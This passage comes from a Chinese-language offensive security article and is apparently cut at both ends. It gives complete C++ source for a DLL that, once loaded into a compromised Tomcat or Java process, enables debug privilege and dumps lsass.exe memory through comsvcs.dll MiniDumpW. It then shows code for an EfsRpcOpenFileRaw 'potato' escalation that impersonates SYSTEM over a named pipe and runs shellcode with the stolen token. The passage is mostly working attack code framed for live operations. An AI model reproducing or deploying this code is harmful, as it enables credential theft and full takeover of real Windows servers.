        AdjustTokenPrivileges(hToken, false, &priv, sizeof(priv), 0, 0);
        CloseHandle(hToken);
        CloseHandle(hThis);
        return true;
    }
    int Dump() {
        EnableDebugPrivilege();
        WCHAR commandLine[MAX_PATH];
        _MiniDumpW MiniDumpW;
        DWORD lsassPID = 0;
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        LPCWSTR processName = L"";
        //遍历lsass.exe 的PID
        if (Process32First(snapshot, &processEntry)) {
            while (_wcsicmp(processName, L"lsass.exe") != 0) {
                Process32Next(snapshot, &processEntry);
                processName = processEntry.szExeFile;
                lsassPID = processEntry.th32ProcessID;
            }
        }
        MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
        _itow(lsassPID, commandLine, 10);
        lstrcatW(commandLine, L" C:\\Windows\\Temp\\111.sql full");
        MiniDumpW(0, 0, commandLine);
        return 0;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            Dump();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
编译成DLL文件发送过去后，我们可以看到Tomcat.exe或者Java.exe的Debug权限已经被开启：
在`C:\Windows\Temp`目录下已经生成进程的内存转储文件。
**注意：如果Tomcat是以SERVICE账户启动的，那么直接加载DLL会造成Tomcat直接崩溃无法工作，这些敏感操作的失败会引发系统的错误处理程序，最终导致Tomcat进程关闭，在实战中应根据业务的重要程度谨慎操作。**
为了避免类似的风险情况，我增加了权限判断、重复转储判断：
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    #include 
    #include 
    #include 
    #include 
    #pragma comment( lib, "Dbghelp.lib" )
    #define _CRT_SECURE_NO_WARNINGS
    typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
    BOOL CheckPrivilege() {
        BOOL state;
        SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
        PSID AdministratorsGroup;
        state = AllocateAndInitializeSid(
            &NtAuthority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS,0, 0, 0, 0,
            &AdministratorsGroup);
        if (state)
        {
            if (!CheckTokenMembership(NULL, AdministratorsGroup, &state))
            {
                state = FALSE;
            }
            FreeSid(AdministratorsGroup);
        }
        return state;
    }
    BOOL EnableDebugPrivilege()
    {
        HANDLE hThis = GetCurrentProcess();
        HANDLE hToken;
        OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, &hToken);
        LUID luid;
        LookupPrivilegeValue(0, TEXT("seDebugPrivilege"), &luid);
        TOKEN_PRIVILEGES priv;
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Luid = luid;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        BOOL isEnabiled = AdjustTokenPrivileges(hToken, false, &priv, sizeof(priv), 0, 0);
        if (isEnabiled) {
            CloseHandle(hToken);
            CloseHandle(hThis);
            return TRUE;
        }
        return FALSE;
    }
    DWORD GetLsassPID() {
        DWORD lsassPID = 0;
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        LPCWSTR processName = L"";
        //遍历lsass.exe 的PID
        if (Process32First(snapshot, &processEntry)) {
            while (_wcsicmp(processName, L"lsass.exe") != 0) {
                Process32Next(snapshot, &processEntry);
                processName = processEntry.szExeFile;
                lsassPID = processEntry.th32ProcessID;
            }
        }
        return lsassPID;
    }
    BOOL CheckFileExists(PWCHAR file) {
        WIN32_FIND_DATA FindFileData;
        HANDLE hFind = FindFirstFileEx(file, FindExInfoStandard, &FindFileData,FindExSearchNameMatch, NULL, 0);
        if (hFind == INVALID_HANDLE_VALUE)
        {
            return FALSE;
        }
        return TRUE;
    }
    int Dump() {
        WCHAR commandLine[MAX_PATH];
        WCHAR DumpFile[] = L"C:\\Windows\\Temp\\111.sql";
        _MiniDumpW MiniDumpW;
        DWORD lsassPID = 0;
        if (!CheckPrivilege()) {
            return -1;
        }
        if (!EnableDebugPrivilege()) {
            return -1;
        }
        if (CheckFileExists(DumpFile)) {
            return 0;
        }
        lsassPID = GetLsassPID();
        MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
        _itow_s(lsassPID, commandLine, 10);
        lstrcatW(commandLine, L" ");
        lstrcatW(commandLine, DumpFile);
        lstrcatW(commandLine, L" full");
        MiniDumpW(0, 0, commandLine);
        return 0;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            Dump();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
首先判断权限是否是管理员或者SYSTEM权限，然后尝试启用SE_DEBUG权限，最后才进行转储，代码我上传到了Github仓库：
## 0x06 将Java进程进行权限提升
Tomcat 有三种权限运行模式：
● Local Service ● Network Service ● Users 默认安装好的Tomcat会自动运行在Local
Service账户下，意味着权限很低，如果目标安装了数字杀毒，就更加难以实现提权。
解决办法：
  1. 利用System.LoadLibrary技术在Tomcat本身进程种执行任意代码
  2. 利用执行任意代码的特点来进行土豆提权
  3. 利用模拟Token创建执行Shellcode的线程，所有的交互通过Webshell与系统管道通信实现
### 0x06.1 EfsRpcOpenFileRaw 提权
土豆提权的原理：在Windows操作系统中，如果当前账户是Local Service/Network
Service，那么大部分情况下会有一个令牌模拟的权限，当高权限连接到Service账户开启的服务时，Service账户就可以通过令牌模拟获取客户端的权限来执行任意代码。
注意：令牌模拟仅是将当前线程的Token进行临时替换为客户端的令牌，其次，土豆提权仅限于本地操作系统才能工作，域内一般发起请求的都是域账户，或有同一账户体系的可信网络内。
土豆提权中有一个关于[MS-EFSR](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8)
RPC接口的利用方式，通过创建一个命名管道，然后调用EfsRpcOpenFileRaw让SYSTEM特权账户连接到命名管道实现提权。[@zcgonvh](https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs)
公开了一个C#的利用代码，并且我还请教了他，这里感谢头像哥的解答。
创建命名管道部分实现代码：
    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
        {
            wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
            LocalFree(pwszPipeName);
            return;
        }
        // 设置安全描述符
        if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL))
        {
            wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
            LocalFree(pwszPipeName);
            return;
        }
        // 创建管道
        hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
        if (hPipe == INVALID_HANDLE_VALUE) {
            return;
        }
        wprintf(L"[*] NamedPipe '%ls' listening...\n", pwszPipeName);
        // 一直等待客户端连接，方便持续调用
        for (;;) {
            if (ConnectNamedPipe(hPipe, NULL) > 0) {
                wprintf(L"[+] A client connected!\n");
                // 模拟客户端Token
                if (!ImpersonateNamedPipeClient(hPipe)) {
                    // 如果无法模拟就断开连接
                    DisconnectNamedPipe(hPipe);
                    continue;
                }
                GetUserName(szUser, &dwSize);
                wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
                // 将特权Token赋值到全局变量中
                OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &g_hSystemToken);
                if (g_ShellcodeBuffer != NULL && g_dwShellcodeSize != 0) {
                    // 如果Shellcode不为空，就开始创建线程执行
                    ExecuteShellCodeWithToken(g_hSystemToken);
                }
                DisconnectNamedPipe(hPipe);
            }
        }
触发RPC连接实现代码：
      RPC_STATUS status;
        RPC_WSTR pszStringBinding;
        RPC_BINDING_HANDLE BindingHandle;
        status = RpcStringBindingCompose(
            NULL,
            (RPC_WSTR)L"ncacn_np",
            (RPC_WSTR)L"\\\\127.0.0.1",
            (RPC_WSTR)L"\\pipe\\lsass",
            NULL,
            &pszStringBinding
        );
        status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
        status = RpcStringFree(&pszStringBinding);
        RpcTryExcept{
            PVOID pContent;
            LPWSTR pwszFileName;
            pwszFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
            StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/random\\C$\\x");
            long result;
            wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFileName);
            result = EfsRpcOpenFileRaw(
                BindingHandle,
                &pContent,
                pwszFileName,
                0
            );
            status = RpcBindingFree(
                &BindingHandle                   // Reference to the opened binding handle
            );
            LocalFree(pwszFileName);
        }
            RpcExcept(1)
        {
            wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
            return FALSE;
        }RpcEndExcept
每次调用EfsRpcOpenFileRaw都会触发SYSTEM进程连接命名管道，然后再通过ImpersonateNamedPipeClient模拟SYSTEM进程的权限执行代码，当ImpersonateNamedPipeClient函数调用成功后，当前线程的Token其实已经变成了SYSTEM账户的，特权代码执行完成后还可以用RevertToSelf恢复到原来的线程Token。
在我实现成功后遇到数字杀毒会拦截提权的行为，其实很多土豆提权成功后，会复制一份Token去创建进程，一般调用CreateProcessWithToken和CreateProcessAsUser比较多，被拦截的时候会是这样：